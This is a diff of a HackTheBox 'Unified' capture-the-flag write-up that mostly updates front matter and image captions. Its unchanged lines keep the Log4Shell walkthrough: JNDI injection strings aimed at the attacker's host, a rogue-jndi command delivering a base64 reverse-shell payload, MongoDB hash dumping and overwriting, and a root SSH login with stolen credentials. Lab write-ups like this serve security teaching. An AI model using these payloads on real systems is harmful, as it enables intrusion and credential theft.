@@ -1,10 +1,21 @@
 ---
+weight: 1
 title: "HackTheBox - Unified Writeup"
 date: 2022-02-19
 draft: false
-tags: ["CVE-2021-44228", "unifi-6.4.54", "log4j", "tcpdump", "rogue-jndi", "mongodb-checking-is-running", "mongodb-dump", "mongodb-update", "generate-sha512-hash", "upgrade-shell-using-script"]
-htb: "HacktheBox"
-linux: "Linux"
+author: "SH∆FIQ ∆IM∆N"
+authorLink: "https://shafiqaiman.com"
+images: []
+resources:
+- name: "featured-image"
+  src: "featured.png"
+
+tags: ["CVE-2021-44228", "unifi-6.4.54", "log4j", "tcpdump", "rogue-jndi", "mongodb-checking-is-running", "mongodb", "mongodb-dump", "mongodb-update", "generate-sha512-hash", "upgrade-shell-using-script"]
+categories: ["HacktheBox"]
+
+lightgallery: true
+toc:
+  auto: false
 ---
 
 ## Nmap
@@ -126,7 +137,7 @@ The Nmap scan result shows `port 8080` is open. It is the `http-proxy` let's nav
 
 ## unifi - 6.4.54
 
-![1](unifi-login-page.png)
+![unifi login page](unifi-login-page.png "unifi login page")
 
 Well, it is just a login page. The first thing I do is try to put some simple credentials such as `admin:admin`, `admin:password`, etc. Unfortunately, I can't get access to it but this page also has the version displayed in front of it.
 
@@ -162,7 +173,7 @@ Accept-Language: en-US,en;q=0.9
 
 I find a way easier method to test it in the `official walkthrough` that you can download. Does it mean I'm not trying it and just reading it? Well, if you have that perception. Here is the blog post talking about that.
 
-![1](htb-blog-writeup-is-ok.png)
+![htb blog writeup is ok](htb-blog-writeup-is-ok.png "htb blog writeup is ok")
 
 This [blog](https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups) is written by two talented person [ippsec](https://twitter.com/ippsec) & [0xdf](https://twitter.com/0xdf)
 
@@ -172,13 +183,12 @@ Enough with all that, Let's test it. First I'm gonna fire up the `burpsuite` to 
 ${jndi:ldap://Tun0 IP Address/test}
 ```
 
-> **JNDI** (`Java Naming and Directory Interface API`). By making calls to this API, applications locate resources and other program objects. 
->
-> **LDAP** `(Lightweight Directory Access Protocol`) The default port that LDAP runs on is `port 389`.
+{{< admonition info >}}
+**JNDI** (`Java Naming and Directory Interface API`). By making calls to this API, applications locate resources and other program objects. </br>
+**LDAP** `(Lightweight Directory Access Protocol`) The default port that LDAP runs on is `port 389`.
+{{< /admonition >}}
 
-![1](burpsuite.png)
-
-
+![execute ping](burpsuite.png "execute ping")
 
 ## tcpdump
 
@@ -190,7 +200,7 @@ sudo tcpdump -i tun0 port 389
 
 After the tcpdump has been started, click the `Send` button.
 
-![1](tcpdump.png)
+![receiving ping](tcpdump.png "receiving ping")
 
 The tcpdump output shows a connection being received on my machine. This proves that the application is vulnerable since it is trying to connect on the LDAP port 389.
 
@@ -202,7 +212,7 @@ Rogue JNDI is a malicious LDAP server for JNDI injection attacks. This will help
 git clone https://github.com/veracode-research/rogue-jndi
 ```
 
-![1](git_clone.png)
+![clone Rogue JNDI](git_clone.png "clone Rogue JNDI")
 
 The `rogue-jndi` is a Java application. In the `official walkthrough`. It says we need to install `Open-JDK` & `Maven` on our system to build the payload. 
 However, if you're using the Linux hacking distribution such as `parrot os` & `kali`. You might have already installed it in those systems but if you don't. Type this to install it make sure to run it with sudo privilege.
@@ -219,7 +229,7 @@ After all, is done, let's build the `Rogue-JNDI` Java application.
 cd rogue-jndi && mvn package
 ```
 
-![1](build-success.png)
+![build success](build-success.png "build success")
 
 ## create a reverse shell payload
 
@@ -239,7 +249,7 @@ Make sure to run the Netcat listener on your desire/reverse_shell port to catch 
 ➜  java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING}|{base64,-d}|{bash,-i}" --hostname "Tun0 IP Address"
 ```
 
-![1](rogue-jndi-argv.png)
+![serve Rogue JNDI server](rogue-jndi-argv.png "serve Rogue JNDI server")
 
 Going back to `burpsuite`. Let's intercept the requests once more but this time the payload going to be this instead; <br>
 After the payload is already set in place. Now, just click a single button it is the `Send` button & BINGO!
@@ -248,7 +258,7 @@ After the payload is already set in place. Now, just click a single button it is
 ${jndi:ldap://Tun0 IP Address:1389/o=tomcat}
 ```
 
-![1](nc.png)
+![shell as unifi](nc.png "shell as unifi")
 
 ## upgrade shell using script
 _<font color="yellow">type this command to upgrade shell:</font>_
@@ -266,7 +276,7 @@ Just type this command on the victim machine. The output shows us `MongoDB` is r
 ps aux | grep mongo
 ```
 
-![1](checking-mongodb.png)
+![check mongodb present](checking-mongodb.png "check mongodb present")
 
 Well, in the article [sprocketsecurity - another log4j on the fire unifi](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) it talks about cracking the password hash and adding our `x_shadow` admin but in the `official walkthrough` did a kinda similar thing but in a more simple way. In this case, you can learn every way to interact or alter the data in `MongoDB`. I already trying them both but in this writeup, I choose the `official walkthrough` way to make it not a super long writeup. 
 
@@ -280,7 +290,7 @@ We already know MongoDB exist in victim machine. Now, we can dump user/password 
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)"
 ```
 
-![1](admin-hash.png)
+![found administrator hash](admin-hash.png "found administrator hash")
 
 After we press `Enter`. The output is so ridiculous its dumps all users, email, password hash, etc. The most important data we want to take a look at is `administrator`. 
 
@@ -294,7 +304,7 @@ Well, the first thing we want to do is generate a `sha-512` hash. To do this we 
 mkpasswd -m sha-512 yourdesirepassword
 ```
 
-![1](mkpasswd.png)
+![generate sha-512 hash](mkpasswd.png "generate sha-512 hash")
 
 Let's proceed to replacing the existing hash with one we created. To do it, type this command:
 
@@ -302,24 +312,24 @@ Let's proceed to replacing the existing hash with one we created. To do it, type
 mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA-512 Hash Generated"}})'
 ```
 
-![1](update-x_shadow.png)
+![update the hash](update-x_shadow.png "update the hash")
 
 Now, we need to verify that the password has been updated in the `MongoDB` by running the same command to dump the user/password. The hash appears to have been updated.
 
-![1](noice.png)
+![verify the changes](noice.png "verify the changes")
 
 ## login page
 Well, let's try login with the username `administrator` and password to whatever you put it as the hash. In my case, it will be `drjohn`. DONE!
 
-![1](login_s_admin.png)
+![unifi admin page](login_s_admin.png "unifi admin page")
 
 ## steal SSH creds
 The Nmap scan result previously shows that `port 22/SSH` is open. To gain access through SSH we must need a valid credential. However, luck is on our side. We can grab ssh credentials by navigating to the setting page by clicking the bottom left button that looks like a gear. Then, scroll down.
 
-![1](stel_ssh.png)
+![found root credentials](stel_ssh.png "found root credentials")
 
 ## ssh as root
 
 Let's log in as root with the creds we found. SUCCESS!!! 
 
-![1](root_ssh.png)
+![ssh as root](root_ssh.png "ssh as root")
